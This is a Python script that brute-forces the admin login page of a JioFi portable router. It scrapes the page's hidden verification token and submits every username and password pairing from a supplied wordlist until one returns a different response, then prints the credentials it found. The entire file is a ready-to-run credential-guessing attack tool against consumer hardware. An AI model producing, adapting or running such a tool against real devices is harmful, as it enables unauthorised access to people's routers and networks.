import requests
import time 
import sys
from colorama import Fore

def _getVerifyToken_():
    tokenvalue = ""
    url = 'http://192.168.225.1'
    response = str(requests.get(url).content)
    s = response.find("<input type=\"hidden\" name=\"RequestVerifyToken\" id=\"RequestVerifyToken\" value=\"")
    if s >= 0 :
        e = response.find("\">", s)
        if e >= 0 :
            Token = list(response[s:e])
            for i in Token:
                if i.isdigit() == True:
                    tokenvalue += i

    return tokenvalue 

def __help__():
    print(" Usage : login_bruteforce.py --w [WORDLIST]")

def bruteforce(filename):
    begin = time.time()
    target_url = 'http://192.168.225.1/cgi-bin/en-jio/login_check.html' # jiofi Login Check URL
    try:
        credentials_file = open(filename, "r")
        credentials_list = credentials_file.readlines()
        creds_count = len(credentials_list)
    except IOError:
        print(f" Can't find \"{filename}\" in the current directory")
        sys.exit(1)

    # look for the error response , Error response and Success response are different
    error_response = requests.get(target_url).content 
    with requests.Session() as session:
        while True:
            count = 1
            for username in credentials_list:
                for i in range(0, creds_count):
                    payload = {'RequestVerifyToken': _getVerifyToken_(), 'act': username.strip(), 'pwd': credentials_list[i].strip()}
                    attack = session.post(target_url, data=payload)
                    if attack.content != error_response:
                        print(Fore.GREEN + " Credentials Found : ")
                        print(" Username = ", username.strip())
                        print(" Password = ", credentials_list[i].strip())
                        print(f" Tested {creds_count} credentials ")
                        end = time.time()
                        print(f" Took : {end - begin} seconds")
                        credentials_file.close()
                        sys.exit(0)
                    elif count == creds_count:
                        print(" No Credentials Found !!")
                        print(Fore.RED + f" Tested {creds_count} credentials") 
                        print(" Try a different wordlist :) ")
                        end = time.time()
                        print(f" Took : {end - begin} seconds")
                        credentials_file.close()
                        sys.exit(0)
                    print(f"count {count} , creds_count {creds_count}")
                count += 1
        
        
    credentials_file.close()

def main():
    argc = len(sys.argv)
    if argc == 1:
        __help__()
    else:    
        for i in range(1, argc):
            if sys.argv[i] == "--w":
                filename = sys.argv[i+1]
                bruteforce(filename)
            else:
                __help__()
    
if __name__=="__main__":
    main()
